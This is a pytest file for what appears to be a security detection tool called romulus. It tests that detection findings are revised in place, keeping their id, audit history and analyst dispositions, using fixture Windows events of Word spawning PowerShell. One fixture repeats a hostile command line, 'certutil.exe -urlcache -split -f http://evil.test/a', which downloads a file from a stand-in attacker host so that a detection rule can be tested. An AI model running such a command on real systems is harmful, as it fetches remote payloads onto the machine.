"""Revising a published direct (sweep) finding in place: same id, history kept, dispositions kept, idempotent, and
visible to every reader of candidates."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import select

from romulus.detect.base import Match, Playbook, PredicateField
from romulus.detect.windows_lineage import LureAppSpawnsCodeRunner
from romulus.detect.windows_proxy import CertutilDownloadDecode
from romulus.hunt.publish import publish_match
from romulus.store import schema as t
from tests.test_sweep import _repo
from tests.windows_process_support import security4688, security4689, sysmon1

WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
T = datetime(2026, 1, 2, tzinfo=UTC)


class _Rule(Playbook):
    id = "test.revision"
    title = "test"
    families = ("process_exec",)
    benign = ()
    next_checks = ()


def _raw_sources(*events):
    return {ref.key: {"fixture": event.id} for event in events for ref in event.raw}


def _match(events, *, lane="high", claim="early", context=(), reason="", group_key=""):
    subject = events[0]
    return Match(_Rule.id, claim, "observed_action", list(events),
                 [PredicateField("process.executable_key", subject.get("process.executable_key"), "o")],
                 subject.ts, "high" if lane == "high" else "medium", lane, "high", subject.entities(), [],
                 group_key=group_key, context_ids=set(context), revision_reason=reason)


def _audits(repo, action="candidate.revised"):
    with repo.engine.connect() as connection:
        return [dict(row) for row in connection.execute(
            select(t.audit_event).where(t.audit_event.c.action == action)).mappings()]


def _publish(repo, match, *events, hunt_id="h1"):
    return publish_match(repo, hunt_id, _Rule(), match, None, _raw_sources(*events))


def _reportable_hunt(repo, hunt_id="h2"):
    """A hunt with the full manifest the report builder reads."""
    repo.create_hunt(hunt_id, {
        "window": {"start": T.isoformat(), "end": (T + timedelta(hours=1)).isoformat()},
        "style": "broad", "hypothesis": "", "original_input": {}, "targets": ["win-host"],
        "pack": {"version": "test", "playbooks": []}, "normalizer": "test", "policy": "test",
        "model": {}, "romulus_version": "test", "agent_mode": "off", "source_profiles": {},
        "budgets": {"wall_clock_minutes": 60},
    }, f"digest-{hunt_id}", "test")
    return hunt_id


def test_an_early_high_is_corrected_in_place_with_history_and_dispositions_kept():
    repo = _repo()
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=10)
    fence = security4689(image=WINWORD, pid=0x700, offset=5)
    row = _publish(repo, _match([child, parent], claim="early high", context=[parent.id]), child, parent)
    repo.add_disposition(row["id"], "web:analyst", "under_review", "looking")

    revised = _match([child, fence], lane="lead", claim="revised: parent ended", context=[fence.id],
                     reason="a later termination of the parent pid falls between parent and child")
    assert _publish(repo, revised, child, fence) is None              # a revision is not a new candidate

    [candidate] = repo.candidates("h1")
    assert candidate["id"] == row["id"]
    assert candidate["lane"] == "lead" and candidate["claim"] == "revised: parent ended"
    # every record either version cited stays cited; only the child is the subject
    assert set(candidate["event_ids"]) == {child.id, parent.id, fence.id}
    assert set(candidate["context_event_ids"]) == {parent.id, fence.id}
    # the fence record that changed the answer has its raw copy stored
    with repo.engine.connect() as connection:
        raw_ids = connection.execute(select(t.typed_event.c.raw_ids).where(
            t.typed_event.c.id == fence.id)).scalar_one()
    assert raw_ids and len(repo.raw_records(raw_ids)) == len(raw_ids)
    # history: the earlier version is kept whole in the audit table and summarized on the candidate
    [audit] = _audits(repo)
    assert audit["detail"]["previous"]["claim"] == "early high"
    assert audit["detail"]["previous"]["lane"] == "high"
    assert audit["detail"]["reason"].startswith("a later termination")
    assert candidate["gate_results"]["_revision"]["count"] == 1
    assert candidate["gate_results"]["_revision"]["summaries"][0]["lane"] == "high"
    # analyst dispositions stay attached to the same id
    statuses = [d["status"] for d in repo.dispositions(row["id"])]
    assert statuses == ["new", "under_review"]


def test_a_revision_is_idempotent_by_digest():
    repo = _repo()
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    _publish(repo, _match([child]), child)
    revised = _match([child], lane="lead", claim="revised", reason="evidence changed")
    _publish(repo, revised, child)
    _publish(repo, revised, child)                                    # a re-run finalize or a resume
    assert len(_audits(repo)) == 1
    assert repo.candidates("h1")[0]["gate_results"]["_revision"]["count"] == 1


def test_a_revision_never_moves_a_finding_to_context_and_needs_a_reason():
    repo = _repo()
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    row = _publish(repo, _match([child]), child)
    with pytest.raises(ValueError):
        repo.revise_candidate({**row, "lane": "context"}, "x")
    with pytest.raises(ValueError):
        repo.revise_candidate(row, "")
    assert repo.candidates("h1")[0]["lane"] == "high"


def test_a_revision_of_an_unpublished_id_inserts_it_once():
    repo = _repo()
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    row = _publish(repo, _match([child], reason="final tally"), child)
    assert row is not None and len(repo.candidates("h1")) == 1        # a first publication returns the row


def test_the_manifest_reports_the_revised_version():
    from romulus.report.manifest import build_manifest

    repo = _repo()
    hunt = _reportable_hunt(repo)
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    row = _publish(repo, _match([child], claim="early high"), child, hunt_id=hunt)
    _publish(repo, _match([child], lane="lead", claim="revised claim", reason="evidence changed"), child,
             hunt_id=hunt)
    manifest = build_manifest(repo, hunt, "test")
    [finding] = [f for f in manifest["findings"] if f["id"] == row["id"]]
    assert finding["claim"] == "revised claim" and finding["lane"] == "lead"
    assert finding["gates"]["_revision"]["count"] == 1


def test_an_expansion_anchor_from_the_early_version_keeps_a_valid_reference():
    repo = _repo()
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    row = _publish(repo, _match([child], claim="early high"), child)
    repo.save_expansion_anchor({
        "id": row["id"], "hunt_id": "h1", "candidate_id": row["id"], "depth": 0, "parent_anchor_id": None,
        "host": child.host, "lane": "high", "severity": "high", "ts": T, "status": "expanded_complete",
        "reasons": [],
    })
    _publish(repo, _match([child], lane="lead", claim="revised", reason="evidence changed"), child)
    with repo.engine.connect() as connection:
        anchor = connection.execute(select(t.expansion_anchor)).mappings().one()
    assert anchor["candidate_id"] == row["id"] and repo.candidate(row["id"]) is not None
    assert anchor["status"] == "expanded_complete"                    # stays expanded; not re-triggered
    assert anchor["lane"] == "lead" and anchor["severity"] == "medium"  # its copied lane follows the revision


# ---- end to end: the rules revise in place through the sweep ----

def _drive(repo, rule, batches):
    """Publish a rule's matches as the sweep does (consume batches, then finalize)."""
    by_id = {event.id: event for batch in batches for event in batch}
    rule.load = lambda ids: [by_id[i] for i in ids if i in by_id]
    raw = _raw_sources(*by_id.values())
    for batch in batches:
        for match in rule.consume(batch):
            publish_match(repo, "h1", rule, match, None, {**raw, **match.raw_copies})
        rule.drain_staged()
        rule.drain_bounds()
    for match in rule.finalize():
        publish_match(repo, "h1", rule, match, None, {**raw, **match.raw_copies})


def test_a_rule_correction_revises_the_early_candidate_and_a_rerun_writes_nothing():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=10)
    late = security4689(image=WINWORD, pid=0x700, offset=5)
    repo = _repo()
    _drive(repo, LureAppSpawnsCodeRunner(), [[parent, child], [late]])
    [candidate] = repo.candidates("h1")
    assert candidate["lane"] == "lead" and "Revised decision" in candidate["claim"]
    assert {child.id, parent.id, late.id} <= set(candidate["event_ids"])
    # resume: the same hunt swept again by fresh rules — nothing new is written
    _drive(repo, LureAppSpawnsCodeRunner(), [[parent, child], [late]])
    assert len(repo.candidates("h1")) == 1 and len(_audits(repo)) == 1


def test_the_fleet_tally_is_revised_in_place_to_the_final_count():
    events = [sysmon1(image=r"C:\Windows\System32\certutil.exe", offset=n, guid=500 + n,
                      command="certutil.exe -urlcache -split -f http://evil.test/a a")
              for n in range(5)]                                     # five records, one host, one shape
    repo = _repo()
    _drive(repo, CertutilDownloadDecode(), [events])
    candidates = repo.candidates("h1")
    fleet = [c for c in candidates if "|fleet|" in c["group_key"]]
    assert len(fleet) == 1                                            # one merged finding, revised in place
    assert "5 process-creation record(s)" in fleet[0]["claim"] and "so far" not in fleet[0]["claim"]
    assert fleet[0]["gate_results"]["_revision"]["count"] == 1
    assert len(candidates) == 2                                       # the host's first record + the merged one
